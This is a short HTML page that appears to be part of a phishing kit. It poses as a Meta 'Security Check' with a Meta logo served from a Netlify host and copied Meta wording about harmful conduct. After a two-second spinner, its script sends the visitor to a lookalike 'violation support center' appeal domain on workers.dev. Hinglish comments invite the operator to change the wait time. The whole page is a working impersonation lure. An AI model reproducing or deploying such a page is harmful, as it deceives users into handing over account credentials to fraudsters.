<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
  /* Body style */
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f0f2f5;
  }

  /* Loader full screen */
  #loader {
    position: fixed;
    top:0;
    left:0;
    width: 100%;
    height: 100%;
    background: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  /* Card style */
  .card {
    background: #fff;
    padding: 30px;
    border-radius: 12px;
    text-align: center;
    box-shadow: 0 5px 20px rgba(0,0,0,0.1);
    width: 320px;
  }

  .card img.logo {
    width: 120px;
    margin-bottom: 20px;
  }

  .card h1 {
    font-size: 20px;
    margin: 10px 0;
  }

  .card p {
    font-size: 14px;
    color: #555;
  }

  /* Spinner */
  .spinner {
    margin-top: 20px;
    width: 40px;
    height: 40px;
    border: 5px solid #ddd;
    border-top-color: #4267B2;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-left: auto;
    margin-right: auto;
  }

  @keyframes spin {
    0% {transform: rotate(0deg);}
    100% {transform: rotate(360deg);}
  }
</style>
</head>
<body>

<!-- Loader Screen -->
<div id="loader">
  <div class="card">
    <img src="https://bucolic-mousse-f80645.netlify.app/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="logo">
    <h1>Security Check</h1>
    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
    <div class="spinner"></div>
  </div>
</div>

<script>
(function() {

  // --- LINK ---
  var target = "https://appeal-this.violationsupportcenter.workers.dev/"; //

  // --- Wait time ---
  var waitTime = 2000; // 2 seconds loader, change kar sakte ho

  setTimeout(function() {
    // Loader hide karne ki jagah, direct redirect
    window.location.href = target;
  }, waitTime);

})();
</script>

</body>
</html>
